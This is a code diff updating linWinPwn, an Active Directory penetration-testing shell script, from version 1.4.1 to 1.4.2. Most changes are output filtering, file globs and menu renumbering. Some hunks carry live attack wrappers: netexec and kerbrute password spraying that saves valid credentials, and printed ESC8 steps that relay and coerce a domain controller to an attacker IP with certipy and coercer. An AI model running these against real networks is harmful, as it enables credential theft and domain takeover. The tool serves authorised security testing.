@@ -159,7 +159,7 @@ print_banner() {
       | || | | | |\ V  V / | | | | |  __/ \ V  V /| | | | 
       |_||_|_| |_| \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_| 
 
-      ${BLUE}linWinPwn: ${CYAN}version 1.4.1 ${NC}
+      ${BLUE}linWinPwn: ${CYAN}version 1.4.2 ${NC}
       https://github.com/lefayjey/linWinPwn
       ${BLUE}Author: ${CYAN}lefayjey${NC}
       ${BLUE}Inspired by: ${CYAN}S3cur3Th1sSh1t's WinPwn${NC}
@@ -496,17 +496,17 @@ prepare() {
         echo -e "${RED}[-] Please ensure netexec is installed and try again... ${NC}"
         exit 1
     elif [ "${offline_bool}" == "false" ]; then
-        dc_info=$(${netexec} ldap --port "${ldap_port}" "${dc_ip}" | grep -v "\[-\]\|Connection refused\|Initializing")
+        dc_info=$(${netexec} ldap --port "${ldap_port}" "${dc_ip}" | grep -v "\[-\]\|Connection refused\|Initializing\|nxc.conf")
         if [[ $dc_info == *"First time use detected"* ]]; then
-            dc_info=$(${netexec} ldap --port "${ldap_port}" "${dc_ip}" | grep -v "\[-\]\|Connection refused\|Initializing")
+            dc_info=$(${netexec} ldap --port "${ldap_port}" "${dc_ip}" | grep -v "\[-\]\|Connection refused\|Initializing\|nxc.conf")
         fi
         if [ -z "$dc_info" ]; then
             echo -e "${PURPLE}[!] Error connecting to LDAP! Please ensure the LDAP port is correct and accessible (--ldaps, --ldap-port 3268). Using SMB only ... ${NC}"
-            dc_info=$(${netexec} smb "${dc_ip}" | grep -v "Connection refused\|Initializing")
+            dc_info=$(${netexec} smb "${dc_ip}" | grep -v "Connection refused\|Initializing\|nxc.conf")
         fi
         if [ -z "$dc_info" ]; then
             echo -e "${PURPLE}[!] Error connecting to SMB! Please ensure the SMB port is correct and accessible. Attempting to use MSSQL ... ${NC}"
-            dc_info=$(${netexec} mssql "${dc_ip}" | grep -v "Connection refused\|Initializing")
+            dc_info=$(${netexec} mssql "${dc_ip}" | grep -v "Connection refused\|Initializing\|nxc.conf")
         fi
         if [ -z "$dc_info" ]; then
             echo -e "${PURPLE}[!] Error connecting to MSSQL! Please ensure the MSSQL port is correct and accessible.${NC}"
@@ -1064,7 +1064,7 @@ parse_servers() {
 }
 
 parse_users() {
-    sort -uf <(sort -uf "${Users_dir}"/users_list_*_"${dc_domain}.txt" 2>/dev/null) >"${users_list}"
+    sort -uf <(sort -uf "${Users_dir}"/users_list_*_*".txt" 2>/dev/null) >"${users_list}"
 
     if [[ ! "${user}" == "" ]] && ! grep -q "${user}" "${users_list}" 2>/dev/null; then echo "${user}" >>"${users_list}"; fi
 }
@@ -1504,7 +1504,23 @@ bloodyad_write_enum() {
             echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
         else
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
-            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get writable --detail" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_writable_${user_out}_${dc_domain}.txt"
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get writable" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_writable_${user_out}_${dc_domain}.txt"
+        fi
+    fi
+    echo -e ""
+}
+
+bloodyad_write_enum_details() {
+    if ! stat "${bloodyad}" >/dev/null 2>&1; then
+        echo -e "${RED}[-] Please verify the installation of bloodyad${NC}"
+    else
+        mkdir -p "${DomainRecon_dir}/bloodyAD"
+        echo -e "${BLUE}[*] bloodyad search for writable objects${NC}"
+        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
+            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
+        else
+            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
+            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get writable --detail" | tee "${DomainRecon_dir}/bloodyAD/bloodyad_writable_details_${user_out}_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -2112,9 +2128,9 @@ adcs_vuln_parse() {
         for vulnca in $esc8_vuln; do
             echo -e "\n${BLUE}# \"${vulnca//SPACE/ }\" certificate authority${NC}"
             echo -e "${CYAN}1. Start the relay server:${NC}"
-            echo -e "${certipy} relay -target http://[ ${pki_servers} ] -ca \"${vulnca//SPACE/ }\" -template [ DomainController ] ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} relay -target http://[ ${pki_servers} ] -ca \"${vulnca//SPACE/ }\" -template [ DomainController ]"
             echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
-            echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l [ ${attacker_IP} ] --dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l [ ${attacker_IP} ] --dc-ip ${dc_ip}"
             echo -e "${CYAN}3. Authenticate using pfx of Domain Controller:${NC}"
             echo -e "${certipy} auth -pfx ${dc_NETBIOS}$.pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
@@ -2593,7 +2609,7 @@ ne_passpray() {
     done
     echo -e "${YELLOW}[i] Password spraying with password ${passpray_password}. This may take a while...${NC}"
     run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} -u ${target_userslist} -p ${passpray_password} --no-bruteforce --continue-on-success --log ${BruteForce_dir}/ne_passpray_output_${dc_domain}.txt" 2>&1
-    grep "\[+\]" "${BruteForce_dir}/ne_passpray_output_${dc_domain}.txt" | cut -d "\\" -f 2 | cut -d " " -f 1 >"${BruteForce_dir}/passpray_valid_ne_${dc_domain}.txt"
+    grep "\[+\]" "${BruteForce_dir}/ne_passpray_output_${dc_domain}.txt" | cut -d "\\" -f 2 | cut -d " " -f 1 >>"${BruteForce_dir}/passpray_valid_ne_${dc_domain}.txt"
     if [ -s "${BruteForce_dir}/passpray_valid_ne_${dc_domain}.txt" ]; then
         echo -e "${GREEN}[+] Printing accounts with passwords found...${NC}"
         /bin/cat "${BruteForce_dir}/passpray_valid_ne_${dc_domain}.txt" | sort -uf
@@ -2624,8 +2640,8 @@ kerbrute_passpray() {
             read -rp ">> " passpray_password </dev/tty
         done
         echo -e "${YELLOW}[i] Password spraying with password ${passpray_password}. This may take a while...${NC}"
-        run_command "${kerbrute} passwordspray ${target_userslist} ${passpray_password} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}" | tee "${BruteForce_dir}/kerbrute_passpray_output_${dc_domain}.txt"
-        grep "VALID" "${BruteForce_dir}/kerbrute_passpray_output_${dc_domain}.txt" | cut -d " " -f 8 | cut -d "@" -f 1 >"${BruteForce_dir}/passpray_valid_kerb_${dc_domain}.txt"
+        run_command "${kerbrute} passwordspray ${target_userslist} ${passpray_password} -d ${dc_domain} --dc ${dc_ip} -t 5 ${argument_kerbrute}" | tee -a "${BruteForce_dir}/kerbrute_passpray_output_${dc_domain}.txt"
+        grep "VALID" "${BruteForce_dir}/kerbrute_passpray_output_${dc_domain}.txt" | cut -d " " -f 8 | cut -d "@" -f 1 >>"${BruteForce_dir}/passpray_valid_kerb_${dc_domain}.txt"
         if [ -s "${BruteForce_dir}/passpray_valid_kerb_${dc_domain}.txt" ]; then
             echo -e "${GREEN}[+] Printing accounts with passwords found ...${NC}"
             /bin/cat "${BruteForce_dir}/passpray_valid_kerb_${dc_domain}.txt" | sort -uf
@@ -3431,7 +3447,7 @@ relayking_check() {
         if [ "${nullsess_bool}" == true ]; then
             run_command "${relayking} ${argument_rking} --protocols smb,ldap,http -t ${curr_targets_list} --dc-ip ${dc_ip} ${ldaps_param} ${dnstcp_param} -ns ${dns_ip} -o plaintext,csv,json --output-file ${Vulnerabilities_dir}/relayking/relayking_nullauth_${dc_domain}" | tee -a "${Vulnerabilities_dir}/relayking/relayking_nullauth_output_${dc_domain}.txt"
         else
-            run_command "${relayking} ${argument_rking} --audit --protocols smb,ldap,ldaps,mssql,http,https -t ${curr_targets_list} --dc-ip ${dc_ip} ${ldaps_param} ${dnstcp_param} -ns ${dns_ip} --threads 10 -o plaintext,csv,json --output-file ${Vulnerabilities_dir}/relayking/relayking_nullauth_${dc_domain} --proto-portscan --gen-relay-list ${Vulnerabilities_dir}/relayking/relaytargets_output_${dc_domain}.txt" | tee -a "${Vulnerabilities_dir}/relayking/relayking_audit_output_${dc_domain}.txt"
+            run_command "${relayking} ${argument_rking} --audit --protocols smb,ldap,ldaps,mssql,http,https -t ${curr_targets_list} --dc-ip ${dc_ip} ${ldaps_param} ${dnstcp_param} -ns ${dns_ip} --threads 10 -o plaintext,csv,json --output-file ${Vulnerabilities_dir}/relayking/relayking_audit_${dc_domain} --proto-portscan --gen-relay-list ${Vulnerabilities_dir}/relayking/relaytargets_output_${dc_domain}.txt" | tee -a "${Vulnerabilities_dir}/relayking/relayking_audit_output_${dc_domain}.txt"
         fi
     fi
     echo -e ""
@@ -3443,7 +3459,7 @@ mssql_enum() {
         echo -e "${RED}[-] Please verify the location of windapsearch and GetUserSPNs.py${NC}"
     else
         echo -e "${BLUE}[*] MSSQL Enumeration${NC}"
-        sed -e 's/ //' -e 's/\$//' -e 's/.*/\U&/' "${Servers_dir}"/sql_list_*_"${dc_domain}.txt" 2>/dev/null | sort -uf >"${sql_hostname_list}" 2>&1
+        sed -e 's/ //' -e 's/\$//' -e 's/.*/\U&/' "${Servers_dir}"/sql_list_*_*".txt" 2>/dev/null | sort -uf >"${sql_hostname_list}" 2>&1
         if [ -s "${DomainRecon_dir}/dns_records_${dc_domain}.csv" ]; then
             for i in $(/bin/cat "${sql_hostname_list}"); do
                 grep -i "$(echo "$i" | cut -d "." -f 1)" "${DomainRecon_dir}/dns_records_${dc_domain}.csv" | grep "A," | grep -v "DnsZones\|@" | cut -d "," -f 3 >> "${sql_ip_list}"
@@ -5091,25 +5107,26 @@ ad_menu() {
     check_tool_status "${impacket_findDelegation}" "Delegation Enumeration using findDelegation and netexec" "9"
     check_tool_status "${bloodyad}" "bloodyAD All Enumeration" "10"
     check_tool_status "${bloodyad}" "bloodyAD write rights Enumeration" "11"
-    check_tool_status "${bloodyad}" "bloodyAD query DNS server" "12"
-    check_tool_status "${bloodyad}" "bloodyAD enumerate object" "13"
-    check_tool_status "${silenthound}" "SilentHound LDAP Enumeration" "14"
-    check_tool_status "${ldeep}" "ldeep LDAP Enumeration" "15"
-    check_tool_status "${windapsearch}" "windapsearch LDAP Enumeration" "16"
-    check_tool_status "${LDAPWordlistHarvester}" "LDAP Wordlist Harvester" "17"
-    check_tool_status "${ldapper}" "LDAP Enumeration using LDAPPER" "18"
-    check_tool_status "${adalanche}" "Adalanche Enumeration" "19"
-    check_tool_status "${rdwatool}" "Enumeration of RDWA servers" "20"
-    check_tool_status "${ldapconsole}" "Open p0dalirius' LDAP Console" "21"
-    check_tool_status "${pyLDAPmonitor}" "Open p0dalirius' LDAP Monitor" "22"
-    check_tool_status "${aced}" "Open garrettfoster13's ACED console" "23"
-    check_tool_status "${ldapper}" "Open LDAPPER custom options" "24"
-    check_tool_status "${godap}" "Run godap console" "25"
-    check_tool_status "${ADCheck}" "Run ADCheck enumerations" "26"
-    check_tool_status "${soapy}" "Run soapy enumerations" "27"
-    check_tool_status "${soaphound}" "Soaphound Enumeration using all collection methods (Noisy!)" "28"
-    check_tool_status "${soaphound}" "Soaphound Enumeration using ADWSOnly" "29"
-    check_tool_status "${daclsearch}" "Run DACLSearch dump and cli" "30"
+    check_tool_status "${bloodyad}" "bloodyAD write rights Enumeration (details)" "12"
+    check_tool_status "${bloodyad}" "bloodyAD query DNS server" "13"
+    check_tool_status "${bloodyad}" "bloodyAD enumerate object" "14"
+    check_tool_status "${silenthound}" "SilentHound LDAP Enumeration" "15"
+    check_tool_status "${ldeep}" "ldeep LDAP Enumeration" "16"
+    check_tool_status "${windapsearch}" "windapsearch LDAP Enumeration" "17"
+    check_tool_status "${LDAPWordlistHarvester}" "LDAP Wordlist Harvester" "18"
+    check_tool_status "${ldapper}" "LDAP Enumeration using LDAPPER" "19"
+    check_tool_status "${adalanche}" "Adalanche Enumeration" "20"
+    check_tool_status "${rdwatool}" "Enumeration of RDWA servers" "21"
+    check_tool_status "${ldapconsole}" "Open p0dalirius' LDAP Console" "22"
+    check_tool_status "${pyLDAPmonitor}" "Open p0dalirius' LDAP Monitor" "23"
+    check_tool_status "${aced}" "Open garrettfoster13's ACED console" "24"
+    check_tool_status "${ldapper}" "Open LDAPPER custom options" "25"
+    check_tool_status "${godap}" "Run godap console" "26"
+    check_tool_status "${ADCheck}" "Run ADCheck enumerations" "27"
+    check_tool_status "${soapy}" "Run soapy enumerations" "28"
+    check_tool_status "${soaphound}" "Soaphound Enumeration using all collection methods (Noisy!)" "29"
+    check_tool_status "${soaphound}" "Soaphound Enumeration using ADWSOnly" "30"
+    check_tool_status "${daclsearch}" "Run DACLSearch dump and cli" "31"
     echo -e "back) Go back"
     echo -e "exit) Exit"
 
@@ -5187,96 +5204,101 @@ ad_menu() {
         ;;
 
     12)
-        bloodyad_dnsquery
+        bloodyad_write_enum_details
         ad_menu
         ;;
 
     13)
-        bloodyad_enum_object
+        bloodyad_dnsquery
         ad_menu
         ;;
 
     14)
-        silenthound_enum
+        bloodyad_enum_object
         ad_menu
         ;;
 
     15)
-        ldeep_enum
+        silenthound_enum
         ad_menu
         ;;
 
     16)
-        windapsearch_enum
+        ldeep_enum
         ad_menu
         ;;
 
     17)
-        ldapwordharv_enum
+        windapsearch_enum
         ad_menu
         ;;
 
     18)
-        ldapper_enum
+        ldapwordharv_enum
         ad_menu
         ;;
 
     19)
-        adalanche_enum
+        ldapper_enum
         ad_menu
         ;;
 
     20)
-        rdwatool_enum
+        adalanche_enum
         ad_menu
         ;;
 
     21)
-        ldap_console
+        rdwatool_enum
         ad_menu
         ;;
 
     22)
-        ldap_monitor
+        ldap_console
         ad_menu
         ;;
 
     23)
-        aced_console
+        ldap_monitor
         ad_menu
         ;;
 
     24)
-        ldapper_console
+        aced_console
         ad_menu
         ;;
 
     25)
-        godap_console
+        ldapper_console
         ad_menu
         ;;
 
     26)
-        adcheck_enum
+        godap_console
         ad_menu
         ;;
 
     27)
-        soapy_enum
+        adcheck_enum
         ad_menu
         ;;
 
     28)
-        soaphd_enum
+        soapy_enum
         ad_menu
         ;;
 
     29)
-        soaphd_enum_dconly
+        soaphd_enum
         ad_menu
         ;;
 
     30)
+        soaphd_enum_dconly
+        ad_menu
+        ;;
+
+    31)
         daclsearch_run
         ad_menu
         ;;
@@ -6420,7 +6442,9 @@ mssql_menu() {
     if [ "${nullsess_bool}" == true ]; then
         echo -e "${PURPLE}[-] MSSQL Enumeration requires credentials${NC}"
     else
+        echo -e "${YELLOW}[i]${NC} Current target(s): ${YELLOW} ${target_sql}${custom_servers}${custom_ip}${NC} - Number of server(s): ${YELLOW}$(wc -l < "${target_sql}")${NC}"
         echo -e "A) MSSQL CHECKS #1-2"
+        echo -e "m) Modify target(s)"
         check_tool_status "${netexec}" "MSSQL Enumeration using netexec" "1"
         check_tool_status "${netexec}" "MSSQL Relay check" "2"
         check_tool_status "${impacket_mssqlclient}" "Open mssqlclient.py console on target" "3"
@@ -6435,6 +6459,12 @@ mssql_menu() {
     case ${option_selected} in
     A)
         mssql_checks
+        mssql_menu
+        ;;
+
+    m)
+        modify_target
+        target_sql=${curr_targets_list}
         mssql_menu
         ;;
 
